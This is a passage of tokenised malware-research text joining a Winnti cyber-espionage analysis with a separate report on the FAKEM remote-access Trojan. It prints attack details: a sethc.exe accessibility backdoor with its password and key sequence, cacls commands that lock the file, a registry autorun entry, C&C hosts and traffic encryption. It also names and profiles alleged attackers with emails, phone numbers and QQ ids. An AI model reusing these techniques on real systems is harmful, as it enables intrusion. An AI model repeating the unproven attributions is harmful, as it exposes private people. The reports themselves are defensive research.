The block is compressed using Zlib ( v.1.2.3 ) compress2 method with compression level 8 .
The data is compressed later and prepended by a 4-bytes header as shown below .
After submitting system information the module expects 4 byte response code from the server after which it sends one 00 byte to complete the handshake procedure .
Then the module expects an interactive communication session with the remote operator .
It provides capability to run various commands including ( command names were defined during reverse engineering ) : process_list kill_process dir_list smbshare_list smbshare_mount dir_make file_delete file_move file_upload file_open file_write file_close file_find url_download_to_file process_start process_start_and_get_output dll_load dll_call_export screen_getsnapshot screen_set_cursor_position screen_send_input tcpproxy_open_connection tcpproxy_close_connection mysql_connect mysql_fetch mysql_disconnect driver_tcpreplay_interact tcpsession_close quit A command output is compressed using Zlib and sent to the server in asynchronous mode .
To summarize , it is obvious that this executable module is a backdoor , capable of taking screenshots , stealing files , downloading new files from the Internet , starting and killing processes , including interactive Windows shell commands , file search and interaction with mysql database server .
Size : 405504 MD5 : cf119a66d4c3e2355c1ec4ac316a7130 Location : C : \RECYCLER\en.exe Creation time ( UTC ) : 2012 - 09 - 06 04:08:53 Link time ( UTC ) : 2009 - 11 - 17 16:02:04 This application is a dropper , it fetches a resource called EXEFILE from current application and saves it into following paths : < CURRENT DIR > \dllcache\sethc.exe C : \WINDOWS\system32\sethc.exe Then the module uses undocumented Windows API from SFC_OS.dll , a function called SfcFileException to update the system version of C : \WINDOWS\system32\sethc.exe .
The file C : \WINDOWS\system32\sethc.exe ( SET High Contrast ) is to enable the High Contrast accessibility feature in order to allow people with visual impairments to log in .
By replacing C : \Windows\SYSTEM32\SETHC.EXE with a custom application an attacker can run an arbitrary application with SYSTEM privileges running in zero session ( in separate desktop space from normal applications ) .
After the new file replaced the system sethc.exe application , current module adjusts the privileges of sethc.exe to disable access to the file from any other application .
This is achieved by calling external system tools cacls .
Replace access rights to the files , allow everyone full access : cacls C : \WINDOWS\system32\sethc.exe /c /e /p everyone : f cacls < CURRENT DIR > \dllcache\sethc.exe /c /e /p everyone : f Revoke access to the file for everyone , leave only system readonly access : cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r everyone cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r administrators cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r users cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r system cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r `` Power Users '' cacls C : \WINDOWS\system32\sethc.exe /c /e /p system : r The dropper also changes the file timestamp .
It is set identical to C : \WINDOWS\system32\ntvdm.exe .
The dropper application has a resource section with Menu , Dialog templates and other information put by the MS Visual Studio Application Wizard .
It includes default system locale from the developer 's system , which is Chinese Simplified .
The dropped application ( from resource EXEFILE ) is described below as sethc.exe .
Size : 20480 MD5 : 3ba06424e8244f17a8d269c4d40c39c9 Location : resource section of En.exe Link time ( UTC ) : 2009 - 05 - 16 07:09:35 This small file has very basic functionality .
It is written using MS Visual C++ with MFC and is used to render a simple dialog window .
Like En.exe it has resource section , describing the dialog window and default locale is set to Chinese Simplified .
Once it replaced local system sethc.exe tool it can be invoked when the desktop is locked with LeftCtrl+LeftShift+PrintScr key combination .
This brings a dialog Window similar to system StickyKeys application .
However , if you press Ctrl+Alt+F you will immediately see a hidden input box .
If you enter `` ydteam '' in the input box and press Ctrl+Alt+K , the application will welcome you with a message box and will execute a TaskManager .
As far as sethc.exe is executed with privileges of local system , the task manager also inherits these privileges and is capable of killing any other process as well as starting any other application with system rights .
Apparently , this is a backdoor to the system .
An attacker can run cmd.exe , add local users with administrative privileges and log in .
We checked if the tool was publicly shared on the Internet , but could n't find a page distributing it freely .
That is why we assume that it is developed and used privately .
Below is full list of all collected domains and IP - addresses of C & C servers have they been mentioned in initial settings of c_20100.nls or hidden in text messages at public places in Internet : C & Cs from public resources : 27.115.103.198:8885 27.115.103.195:8885 114.222.36.32:10000 27.115.103.195:23456 27.115.103.195:10000 nx2.joymax.in:80 nx3.joymax.in:80 nx2.intercpu.com:25 ( 174.36.138.30 ) nx3.intercpu.com:25 ( 174.36.138.30 ) nx3.interdriver.net:53 ( 119.240.212.110 ) stan227.guicp.net:8008 Hardcoded C & C from the malware : service.interdriver.net:443 ( 98.126.218.64 , 199.188.106.231 ) service.googlefiles.net:53 ( 98.126.218.64 , 199.188.106.231 ) service.dell-support.org:25 service.hp-supports.com:80 tank.hja63.com a1.googletrait.com a1.nexongame.net a1.reegame.net mail.nexongame.net Interestingly , there is an overlap of C & Cs from public resources and hardcoded domains : nx3.interdriver.net:53 < = = = > service.interdriver.net:443 The nx3.interdriver.net was published by awertasegfae @ yahoo.com and was discovered at http : //awertasegfae.blogspot.ru/2011/10/first - test.html .
This means that at least the individual who owns awertasegfae @ yahoo.com for sure belongs to the same gang who attacked CompanyXYZ .
So , who is behind Winnti ? While analyzing the malicious files that we detected during our investigations we found some details which may cast some light on the source of the attacks .
As part of our investigation , we monitored exactly what the cybercriminals did on an infected PC .
In particular , they downloaded an auxiliary program ff._exe to the Config . Msi folder on the infected machine .
This code searches for HTML , MS Excel , MS Word , Adobe , PowerPoint and MS Works documents and text files ( .txt
Debugging lines were found in ff._exe _ that possibly point to the nationality of the cybercriminals .
They were not immediately noticeable because they looked like this in the editor : However , during a detailed analysis it emerged that the text is in Chinese Simplified GBK coding .
This is what these lines look in Chinese : Below is a machine translation of this text into English : In addition , cybercriminals used the AheadLib program to create malicious libraries ( for details , see the second part of the article ) .
This is a program with a Chinese interface .
Chinese text was also found in one of the components of the malicious program CmdPlus.dll plug - in : It would appear that the attackers can at least speak Chinese .
However , not everything is so clear cut : because the file transfer plug - in has not been implemented entirely safely , a command which includes the attackers ' local path ( where the file comes from and where it is saved to ) arrives during the process of downloading / uploading files on the infected system .
While monitoring the cybercriminals ' activity on the infected machine , we noticed they uploaded the certificate they found in the infected system , and the network traffic reflected the local path indicating the place where they saved the file on their computer : These characters appear to be Korean , meaning `` desktop '' .
This means the attackers were working on a Korean Windows operating system .
Therefore , we can presume that the attack is not exclusively the work of Chinese- speaking cybercriminals .
Locating the attacker is one of the most non - trivial parts of the research .
The attackers normally do not leave any traces in the malware that can be directly bound to their real identities .
That is why we have to use all available bits of information that seems to find other unique related content on the Internet or any other available data sources .
One of the important stages is to extract unique identifiers / nicknames / tags that can be discovered on the Internet and after that find individuals who are related to creation or distribution of this content .
The string `` ydteam '' looked non - random and we decided to check it on the Internet .
It turned out that YDteam is a hackers group name and has a lot of references on Chinese segment of the Internet : There was a website ydteam.cn that seems to be related to the activity of the group .
According to the domaintools.com database , it was registered on 2009 - 10 - 06 15:12 and put on hold around 2010 - 10 - 08 .
The original WHOIS information from domaintools.com : Registrant name 魏楠 ( Wei Nan ) seems to be represented in the mailbox wn6805 @ 126.com , which could mean the owner of the website used real identity .
The domain was most likely registered by the team leader .
The email itself was used on several other websites .
For example The webpage above has a post offering to `` help with cheap shopping online '' .
That is most likely related to a fraudulent activity of the email owner ( stolen Internet - banking credentials or credit card information ) .
The same page reveals a QQ i d of that individual and a username : Another page http : //www.gtvod.com / gtvod / jsp / public / personal / index.jsp ? id=20100127213936126005 shows information about the user registered with name `` wn3118 '' and the same email : Another page http : //tieba.baidu.com / p/652667782 has a message from profile `` 灬low - key , wn '' ( which links to wn6805 @ 126.com ) .
Profile information reveals gender of the individual : There are few essays in Chinese probably written by the individual owning wn6805 @ 126.com while studying at Junior High School : A page from zww.cn also shows some details about the author : http : //www.zww.cn / zw / myzw.asp ? u= % CA % A7 % C8 % A5 % B0 % AE Searching for the QQ i d 251985076 brings to http : //blog.sina.com.cn / dahuadl that has User mobile number : 13847416805 The hackers team also seemed to own ydteam.com for some time according to reference at http : //zzsky.5d6d.net / archiver / tid-127.html Domaintools.com shows that the domain was registered to a Chinese individual from 2009 - 06 - 03 to 2011 - 08 - 22 .
After that WHOIS information was protected by a Privacy protection service .
Here is WHOIS data at the time of domain registration : Please note , that + 8613652452428 is a Chinese local cell phone number .
It shows some of the team member names mentioned above .
Another trace to the source of attack is based on email sender IP address .
The emails were sent from 118.142.11.114 .
According to robtex.com , there are 2 domain names that share this IP : Pad62.com was created in 2011 - 06 - 05 , on the date of registration if had non - protected WHOIS information , according to domaintools.com : We checked which other domains are associated with the WHOIS information above and found the following domain names : One more route is to check the C & C of the initial dropper / downloader module .
This was tank.hja63.com .
Acccording to domain tools , hja63.com had non - protected WHOIS information in 2011 : When we checked , tank.hja63.com resolved to 173.234.184.45 ( owned by DiaHosting Limited , USA ) , while hja63.com resolved to 68.178.232.100 ( GoDaddy ISP server ) .
Analysis of the file c_20100.nls revealed additional information leading to probable attackers .
Looking for identifiers ( used as message boundaries , or delimiters ) B9273C17 and B6A74634 specified in this malicious file on Internet we found the following pages where the attackers left messages for the bots : Another place of just mentioned forum thread : Here , we see these emails used as commenters ' identifiers : Jimycoco … @ gmail.com awertase ...
Searching for `` awertase '' brought another forum thread where ciphered data for the same bot appeared : http : //osdir.com / ml / openmeetings - dev/2011 - 09/msg00364.html The full email behind awertase ...
Google Search for the nickname '' mer4en7y '' returned 5490 results .
This is a very active user that posts messages for this type of bot .
The first results lead to hacker forums and IT - security specific web - platforms .
The same nickname has appeared on a well- known Romanian Security Team forum .
According to the following , Mer4en7y submitted a vulnerability found in Weihai City Commercial Bank system : http : //wooyun.org / bugs / wooyun-2010 - 011002 Favorite videos and tutorials of Mer4en7y : http : //www.tdcqjslt.com / u.php ? uid=1918 Mer4en7y 's micro - blogging page at t.qq.com : http : //t.qq.com / mer4en7y Alias of that profile is translated as `` watching a rain '' .
A user with nickname `` d4nr4n '' ( http : //t.qq.com / d4nr4n ) is posting a message where mer4en7y is mentioned : Google translation : `` % mentioned individuals % go to Nanjing tomorrow xx training institutions to maintain four months … C++ learning , seeking Nanjing - based friends of the exchange '' Mer4en7y at yoyo2008.com : http : //www.yoyo2008.com / home.php ? mod = space & uid=41498 Mer4en7y profile at yoyo2008.com One of two friends of Mer4en7y in yoyo2008 social network is a user named `` mayuan '' which seems to be from Xinjiang and a graduate of Judicial Police School according to shared private information out there : http : //u.pintour.com / uid - b1bf56e230cc42d9bfa003a7718888d2/ Mer4en7y 's exploit has been involved in the penetration of public radio service ftp server ( according to WHOIS information this domain belongs to Xi'an Municipal Bureau of Radio and Television ) .
As we can see here Mer4en7y had an email address associated with 90sec hackers team .
Another reference on the net shows that Mer4en7y is after sourcecode of proprietary products ( probably udf.dll from Roxio Inc ) : http : //www.uedbox.com / udf - dll - source/ The following confirms that Mer4en7y is a member of 90sec group .
The group website is located at http : //www.90sec.org/ : Mer4en7y replies on job offer posted at 90sec forum ( someone wanted to hire computer exerts with very special knowledge ) : https : //forum.90sec.org / viewthread.php ? action = printable & tid=2012 Rough translation of job offer from Chinese : '' Subject : Looking for information security researcher From : Southland sword Time : 2012 - 04 - 06 00:38 Subject : Security researcher job Responsibilities : 1 .
Full target penetration alone or with a team depending on available resources ; 2 .
Penetration testing report and recommendations Technical requirements : 1 .
Knowledge of penetration testing , methods , processes , proficiency in a variety of penetration testing tools ; 2 .
Knowledge of common Web development languages ( asp , php , jsp ) , experience with SQL - injection , XSS , common websecurity exploits and patches ; 3 .
Experience with all kinds of operating systems and databases for common security vulnerabilities ; 4 .
Good verbal and written language skills ; 5 .
Be able to work in a team ; individuals who lose trust , do not listen to the teamleader and not accepting the rules will be kicked out ; Work Location : Guangdong ( OR Guangzhou Shenzhen ) Baochibaozhu package , Relatively free playing time .
Salary : monthly allocation of the total amount of work and cooperation share more than 1W .
Vacancies : 5 people For candidates : first contact me ( preferably work resume ) , after my check the resume will be passed to the head coordinator for arranging a personal meeting .
Salary : free meal and apartments , office location is in a senior villa suite of 200 square meters , computers are available but please bring your own hard drive with environment and tools you are familiar with .
Even a single completed project will provide you with money for your monthly expenses .
Powerful background .
No comments ! Tho who are competent , please contact : Email : Infosec @ cntv.cn QQ : admin @ inessus.com '' And Mer4en7y 's replied to this job offer : Which can be translated as : `` Are n't you recruiting people for APT ? Guangzhou is too far , but anyway I support it '' .
There are some interesting comments in the mentioned forum thread regarding reference `` Powerful background '' in job offer .
People in the thread speculated that it could mean the work is supported by the government .
The very first one is labeled as `` first home '' / `` first love '' and contains a ciphered C & C domain as described above , i.e .
C & C domain is encrypted with RC4 algorithm and its hex binary value is presented in text format between delimiters .
But the next message dubbed `` second '' contains a ciphered C & C domain too but it is encoded in another way : The initial C & C domain is XORed with fixed byte value and the resulted data is transformed using BASE64 encoding .
The resulted text is inserted between the same delimiters .
By all appearances this method is used in the next version of the backdoor which is the subject of current research ( see c_20100.NLS ) .
It is also possible that programs with support of either this or that encryption could be used simultaneously in the frame of one attack .
Between all found messages for the bot the second type of messages ( BASE64 ) is significantly prevalent .
A link to this `` Jimycocowell home '' is also present at following place of `` bitgodgod '' user : http : //www.blogger.com / profile/06442609461818597659 We have located one sample of Winnti malware with a hardcoded C & C : mail.7niu.com .
Domaintools information about the domain : Domain Name : 7niu.com PunnyCode : 7niu.com Creation Date : 2006 - 06 - 11 00:00:00 Updated Date : 2012 - 01 - 27 21:35:57 Expiration Date : 2016 - 06 - 11 00:00:00 Registrant : Organization : qi tou niu Name : xibei jiao Address : beijing City : beijing Province / State : Beijing Country : CN Postal Code : 100000 Administrative Contact : Name : xibei jiao Organization : qi tou niu Address : beijing City : beijing Province / State : Beijing Country : beijing Postal Code : 100000 Phone Number : 86 -- 1321333333 Fax : 86 -- 010555555 Email : bit_bugbug @ tom.com Technical Contact : Name : xibei jiao Organization : qi tou niu Address : beijing City : beijing Province / State : Beijing Country : CN Postal Code : 100000 Phone Number : 86 -- 1321333333 Fax : 86 -- 010555555 Email : rain @ etang.com You can see how similar `` bitbugbug '' and `` bitgodgod '' .
Both are directly related to Winnti activity .
The email address `` bit_bugbug @ tom.com '' also can be found on Chinese websites about home rentals : http : //oldhouse.0379home.com / RentView-1108.html We have located another individual calling himself Yang .
He distributed bot control commands and was quite active on the internet as well .
Signature is a message for a bot : So , both Yang8559420 and Lovemeyang messages go with signature : http : //bbs.iaixue.com / forum.php ? mod = viewthread & tid=261 http : //bbs.iaixue.com / forum.php ? mod = viewthread & tid=612 … Search for `` lovemeyang '' returned too much data , making it difficult tofilter out those identifying possible attackers – false positives are highly - probable .
However , it 's worth mentioning that the following link refers to an account with the `` lovemeyang '' username and the user has earlier posted blogs relating to IT - security , so possibly the user is that Yang who is involved in the attack : http : //lovemeyang.blog.51cto.com/659880/195451 Our research revealed long - term oriented large scale cyber - espionage campaign of a criminal group with Chinese origins .
These attacks are not new , many other security researchers have published details of various cybercriminal groups coming from China .
However , the current hacking group has distinguishable features that make it stand out among others : - Massive abuse of digital signatures ; the attackers used digital signatures of one victim company to attack other companies and steal more digital certificates ; - Usage of kernel level 64-bit signed rootkit ; - Abusing great variety of public Internet resources to store control commands for the malware in an encrypted form ; - Sharing / selling stolen certificates to other groups that had different objectives ( attacks against Uyghur and Tibetan activists ) ; - Stealing source code and other intellectual property of software developers in online gaming industry .
The Winnti hacking group is not the first and not the last .
By making our research paper available to the public , we hope that it will not only spread the knowledge among security researchers but also will help system administrators and security officials in all type of organizations around the world to learn the tactics and tools of the perpetrators .
We hope that our shared knowledge will help to better protect IT infrastructure .
We also hope that our message will reach Chinese law enforcement agencies .
If the current research is not enough to initiate criminal investigation , we hope that it will be enough at least to make some checks and probably prevent other malicious activity from reaching out foreign countries and business within China .
The perpetrators of targeted attacks aim to maintain persistent presence in a target network in order to extract sensitive data when needed .
To maintain persistent presence , attackers seek to blend in with normal network traffic and use ports that are typically allowed by firewalls .
As a result , many of the malware used in targeted attacks utilize the HTTP and HTTPS protocols to appear like web traffic .
However , while these malware do give attackers full control over a compromised system , they are often simple and configured to carry out a few commands .
Attackers often use remote access Trojans ( RATs ) , which typically have graphical user interfaces ( GUIs ) and remote desktop features that include directory browsing , file transfer , and the ability to take screenshots and activate the microphone and web camera of a compromised computer .
Attackers often use publicly available RATs like Gh0st , PoisonIvy , Hupigon , and DRAT , and `` closed - released '' RATs like MFC Hunter and PlugX.1 However , the network traffic these RATs produce is well - known and easily detectable although attackers still successfully use them.2 Attackers always look for ways to blend their malicious traffic with legitimate traffic to avoid detection .
We found a family of RATs that we call `` FAKEM '' that make their network traffic look like various protocols .
Some variants attempt to disguise network traffic to look like Windows® Messenger and Yahoo ! ® Messenger traffic .
Another variant tries to make the content of its traffic look like HTML .
While the disguises the RATs use are simple and distinguishable from legitimate traffic , they may be just good enough to avoid further scrutiny .
All three versions of the FAKEM RAT that we investigated were distributed via spear - phishing emails using social engineering to lure targets into executing a malicious attachment .
While we observed the use of different themes , the content of the emails were always interesting to potential targets .
The malicious attachments were most often Microsoft® Word® documents with code that exploits the following vulnerabilities : • CVE-2010 - 3333 : RTF Stack Buffer Overflow Vulnerability addressed in Microsoft Security Bulletin MS10 - 087.3 • CVE-2012 - 0158 : MSCOMCTL.OCX RCE Vulnerability addressed in Microsoft Security Bulletin MS12 - 027.4 We also found a Microsoft® Excel® file that exploits CVE-2009 - 3129 , the Excel Featheader Record Memory Corruption Vulnerability addressed in Microsoft Security Bulletin MS09 - 067.5 We also saw samples that were simply executable ( .EXE
After exploitation , an .EXE
It then adds the following registry entry to enable its automatic execution at every system startup : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\policies\Explorer\run tpbar = `` % System % \tpframe.exe '' The network traffic the malware produces is designed to look like Windows Messenger traffic .
Malware of this type were discussed on Twitter , noted by SonicWALL , and found to have been active as far back as September 2009.7 However , it remains unclear if all the attacks that used this malware were connected .
The malicious traffic begins with headers similar to actual Windows Messenger traffic : MSG 5 N 130 MIME - Version : 1.0 However , beyond this , you will see that the traffic is not valid Windows Messenger traffic but may be sufficiently disguised as such to escape further scrutiny .
During our investigation of the fake `` Windows Messenger '' RAT , we found another version that attempts to disguise its network traffic as Yahoo ! Messenger traffic .
The network communication this version uses begins with YMSG , the Yahoo ! Messenger traffic header .
Compared with the legitimate Yahoo ! Messenger traffic shown in Figure 5 , it is easy to distinguish between the two .
A third version of the FAKEM RAT attempts to disguise the network traffic it produces as HTML .
The malicious traffic begins with strings like < html > < title > 1 .. 56 < /title > < body > or < html > < title > 12356 < /title > < body > .8
This is a fairly rudimentary disguise and odd because you would expect HTML to be the result of a request to a web server and not as something a client would send to a web server .
The network communication between the compromised computer and the RAT controller is encrypted .
The encryption is the same across variants and done at the bit level .
Each byte is XOR - ed by every letter in the string , YHCRA , and rotated 3 bits to the right after every XOR operation .
Encrypting the communication ensures that the suspicious data passed between the compromised host and the attackers can not be easily viewed in plain text .
The communication comes in 1024-byte blobs of data that start with the 32-byte header .
It appears that attackers may specify any kind of fake headers within the first 32 bytes in order to disguise the subsequent network traffic .
The following bits of information are initially sent by the compromised host when the communication starts : • User name • Computer name • OEM code page identifier • What looks like a campaign code but only for some samples The commands are not preconfigured as the malware relies on the data sent by the server .
For instance , when a client receives the command , 0211 , this signifies that it should execute the accompanying data in memory .
The following are the commands the server issues and their meanings : • 0211 : Execute code .
To determine the RAT 's capabilities , we allowed the attackers to infiltrate a honeypot computer and captured all of the network traffic it generated .
We decrypted the network traffic and determined the commands the attackers used , which include : • CmdMana : Command Manager allows attackers to execute shell commands .
The Windows Messenger samples we analyzed were clustered into five groups that did not have overlapping linkages .
Four of the clusters were relatively small and focused on four different domains : • vcvcvcvc.dyndns.org • zjhao.dtdns.net • avira.suroot.com • * .googmail.com The vcvcvcvc.dyndns.org domain is particularly interesting because we also found it being used as a command - and - control ( C & C ) server for Protux - a well- known malware family that has been used in many targeted attacks over the years .
We also found that the avira.suroot.com domain used as a C & C server for yet another malware family we call `` cxgid .
However , the largest cluster revolved around the * .yourturbe.org domain and overlapped with the HTML variant .
We also found small clusters of the HTML variant that revolved around the domain , endless.zapto.org , which was downloaded as a second - stage malware by Protux .
Meanwhile , the Yahoo ! Messenger samples we analyzed all accessed freeavg .
The various samples we collected appear to belong to groups that overlapped a little .
This suggests that rather than being associated with a particular campaign , the use of various FAKEM RATs could be distributed among multiple threat actors .
Knowledge of the attack tools , techniques , and infrastructure of adversaries is critical for developing defensive strategies .
This research paper examined three variants of a RAT - FAKEM - that attempt to disguise the network traffic they produce to stay under the radar .
Now that popular RATs like Gh0st and PoisonIvy have become well - known and can easily be detected , attackers are looking for methods to blend in with legitimate traffic .
While it is possible to distinguish the network traffic FAKEM RAT variants produce for the legitimate protocols they aim to spoof , doing so in the context of a large network may not be not easy .
The RAT 's ability to mask the traffic it produces may be enough to provide attackers enough cover to survive longer in a compromised environment .
Fortunately , solutions like Trend Micro™ Deep Discovery can help network administrators protect their organizations from attacks that use the FAKEM RAT by detecting the traffic its variants produce .
